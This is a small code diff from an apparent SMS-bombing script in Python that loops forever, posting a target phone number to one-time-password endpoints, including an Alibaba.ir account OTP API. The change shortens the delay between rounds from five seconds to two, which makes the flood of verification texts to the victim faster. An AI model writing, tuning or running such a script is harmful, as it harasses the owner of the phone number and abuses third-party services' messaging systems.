@@ -10,7 +10,7 @@ url2 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
 pnd = {'cellphon': f'{phonen}'}
 
 while True:
-      time.sleep(5)
+      time.sleep(2)
       req = requests.post(url, json=pnd)
       req1 = requests.get(url1)
       req2 = requests.post(url, json=pnd)
